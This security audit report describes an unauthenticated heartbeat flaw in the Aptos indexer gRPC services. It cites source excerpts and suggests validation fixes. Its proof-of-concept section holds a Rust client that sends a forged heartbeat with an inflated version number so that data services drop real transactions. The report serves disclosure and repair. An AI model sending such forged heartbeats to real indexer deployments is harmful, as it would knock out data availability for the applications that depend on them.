# Audit Report

## Title
HeartbeatResponse Version Manipulation Causes Transaction Data Loss During Service Initialization

## Summary
The `HeartbeatResponse.known_latest_version` field can be manipulated by an attacker to cause indexer data services to permanently skip processing legitimate blockchain transactions. By sending an inflated version number during service initialization, all actual blockchain data gets rejected as "too old" and is never cached or served to clients.

## Finding Description
The Aptos indexer gRPC architecture uses a heartbeat protocol where services exchange `known_latest_version` values to track blockchain progress. This value flows through multiple components without validation:

1. **Source of Truth**: Fullnodes report their `known_latest_version` via heartbeat messages [1](#0-0) 

2. **Unvalidated Acceptance**: The GrpcManager's metadata_manager accepts this value without validation [2](#0-1) 

3. **Propagation**: The GrpcManager returns this value in HeartbeatResponse to data services [3](#0-2) 

4. **Critical Initialization**: Data services wait for a non-zero `known_latest_version` during initialization [4](#0-3) 

5. **Cache Window Setup**: The LiveDataService uses this value to initialize its cache [5](#0-4) [6](#0-5) 

6. **Data Rejection**: The DataManager rejects transactions with versions below its initialized start window as "too old" [7](#0-6) 

**Attack Scenario:**
- Attacker sends HeartbeatRequest with `FullnodeInfo.known_latest_version = 10000000` (inflated)
- Actual blockchain is at version 1000
- Data service initializes with cache window starting at ~10000000
- When fetch_manager retrieves actual blockchain data (versions 1000-2000), DataManager rejects it: `end_version (2000) <= start_version (9999000)` â†’ "data too old"
- ALL legitimate transactions are permanently dropped from the cache

## Impact Explanation
This is a **Medium severity** vulnerability per Aptos bug bounty criteria:

- **State Inconsistencies**: Indexer data services become unable to serve blockchain data, creating severe inconsistencies between the actual chain state and what indexers can observe
- **Data Availability Failure**: All transaction queries to affected data services fail, breaking dependent applications and analytics platforms
- **Service Disruption**: Requires manual intervention to restart services with correct initialization parameters

The vulnerability doesn't directly affect consensus or steal funds, but it breaks the data availability guarantees that the indexer infrastructure is designed to provide. Applications relying on indexer data would experience complete service outages.

## Likelihood Explanation
**Likelihood: Medium-High**

The attack is straightforward to execute:
- No authentication is required for HeartbeatRequest messages beyond network connectivity [8](#0-7) 

- The vulnerability window is during service initialization, which occurs whenever data services are deployed or restarted
- An attacker only needs to send a single malicious heartbeat during the initialization window (lines 132-140 of connection_manager.rs)
- The impact is permanent until manual intervention

The attack requires timing (catching the service during initialization), but given the frequency of deployments and restarts in production systems, this window regularly occurs.

## Recommendation
Implement validation of `known_latest_version` values against the actual blockchain state:

1. **Add Version Bounds Checking**: Reject `known_latest_version` values that are unreasonably far ahead of the current chain state. For example:
   ```rust
   const MAX_REASONABLE_VERSION_DELTA: u64 = 1000000; // ~1M versions ahead
   
   fn validate_known_latest_version(&self, reported_version: u64, actual_version: u64) -> bool {
       reported_version <= actual_version + MAX_REASONABLE_VERSION_DELTA
   }
   ```

2. **Cross-Validate with Multiple Sources**: During initialization, require consensus from multiple fullnodes before accepting a `known_latest_version`:
   ```rust
   // In ConnectionManager::new()
   let mut version_reports: Vec<u64> = vec![];
   for entry in res.grpc_manager_connections.iter() {
       if let Ok(version) = res.get_version_from_manager(entry.key()).await {
           version_reports.push(version);
       }
   }
   // Use median or require majority consensus
   let validated_version = calculate_consensus_version(version_reports);
   ```

3. **Add Fullnode Authentication**: Implement authentication for fullnode heartbeat messages to prevent arbitrary actors from injecting false version data

4. **Sanity Check Against GrpcManager Data**: Query the GrpcManager's actual cached transaction data to verify the reported version is realistic before using it for cache initialization

## Proof of Concept

```rust
// Malicious HeartbeatRequest sender
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    FullnodeInfo,
    HeartbeatRequest,
    ServiceInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to GrpcManager
    let channel = Channel::from_static("http://grpc-manager:50051")
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);
    
    // Send malicious heartbeat with inflated version
    let malicious_info = FullnodeInfo {
        chain_id: 1, // Correct chain ID
        timestamp: Some(/* current timestamp */),
        known_latest_version: Some(10_000_000), // Inflated version (real chain at ~1000)
    };
    
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("malicious-fullnode:50052".to_string()),
            info: Some(Info::FullnodeInfo(malicious_info)),
        }),
    };
    
    // This gets accepted without validation
    let response = client.heartbeat(request).await?;
    println!("Attack successful! GrpcManager now reports inflated version: {:?}", 
             response.into_inner().known_latest_version);
    
    // Any data service initializing after this point will:
    // 1. Receive known_latest_version = 10_000_000 in HeartbeatResponse
    // 2. Initialize cache starting at version ~10_000_000
    // 3. Reject all actual blockchain data (at version 1000) as "too old"
    
    Ok(())
}
```

## Notes
This vulnerability specifically affects the indexer gRPC infrastructure, not the core consensus or execution layers. However, it demonstrates a critical failure in the trust model where external inputs (fullnode version reports) are accepted without validation, leading to data availability failures. The issue is particularly severe because it occurs during initialization and persists until manual intervention.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L212-217)
```rust
        let known_latest_version = self
            .service_context
            .context
            .db
            .get_synced_version()
            .map_err(|e| Status::internal(format!("{e}")))?;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L539-544)
```rust
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L42-44)
```rust
        Ok(Response::new(HeartbeatResponse {
            known_latest_version: Some(self.metadata_manager.get_known_latest_version()),
        }))
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L132-140)
```rust
        while res.known_latest_version.load(Ordering::SeqCst) == 0 {
            for entry in res.grpc_manager_connections.iter() {
                let address = entry.key();
                if let Err(e) = res.heartbeat(address).await {
                    warn!("Error during heartbeat: {e}.");
                }
            }
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L44-50)
```rust
        let known_latest_version = connection_manager.known_latest_version();
        Self {
            chain_id,
            connection_manager: connection_manager.clone(),
            in_memory_cache: InMemoryCache::new(
                connection_manager,
                known_latest_version,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L28-32)
```rust
        let data_manager = Arc::new(RwLock::new(DataManager::new(
            known_latest_version + 1,
            num_slots,
            size_limit_bytes,
        )));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/data_manager.rs (L60-67)
```rust
        if end_version <= self.start_version {
            warn!(
                "The data is too old, cache start_version: {}, data end_version: {end_version}.",
                self.start_version
            );
            COUNTER.with_label_values(&["data_too_old"]).inc();
            return;
        }
```
